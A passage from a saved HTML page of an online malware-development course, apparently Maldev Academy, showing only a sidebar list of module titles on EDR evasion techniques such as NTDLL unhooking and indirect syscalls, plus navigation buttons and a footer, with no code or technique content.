                            <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./82.html">
                                <div for="module-82" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 82 - Introduction To EDRs
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-83" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./83.html">
                                <div for="module-83" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 83 - NTDLL Unhooking - Introduction
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-84" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./84.html">
                                <div for="module-84" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 84 - NTDLL Unhooking - From Disk
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-85" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./85.html">
                                <div for="module-85" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 85 - NTDLL Unhooking - From KnownDlls Directory
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-86" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./86.html">
                                <div for="module-86" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 86 - NTDLL Unhooking - From a Suspended Process
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-87" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./87.html">
                                <div for="module-87" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 87 - NTDLL Unhooking - From a Web Server
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-88" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./88.html">
                                <div for="module-88" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 88 - Updating Hell's Gate
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-89" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./89.html">
                                <div for="module-89" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 89 - Indirect Syscalls - HellsHall
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-90" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./90.html">
                                <div for="module-90" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 90 - Block DLL Policy
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-91" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./91.html">
                                <div for="module-91" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 91 - Diving Into NtCreateUserProcess
                                </div>
                            </a>
                        </div>
                                                    </div>
                </div>
            </div>
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="./29.html">
                    <button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button>
                </a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="../All Modules.html">
                    <button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button>
                </a>           
            </div>
                     
            <div class="my-2 mr-2">
            <form id="complete-module" action="./30/complete" method="POST">
            </form>
            <form id="uncomplete-module" action="./30#" method="POST">
            </form>
            </div>
           
                            <div class="mr-2">
                    <a data-target="_self" href="./31.html">
                        <button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button>
                    </a>
                </div>
                    </div>
    </div>
    <input type="hidden" id="objectives-completed" value="17077">
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"></path>
          </svg>            
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="30_files/jquery-3.6.0.min.js"></script>
        <script src="30_files/bootstrap.min.js"></script>
        <script src="30_files/navbar.js"></script>
        <link rel="preload" as="style" href="30_files/app.12640c20.css"><link rel="modulepreload" href="30_files/app.2a52064d.js"><link rel="stylesheet" href="30_files/app.12640c20.css"><script type="module" src="30_files/app.2a52064d.js"></script>
<script src="30_files/moduleviewer.js"></script>


 

    
</a></body></html>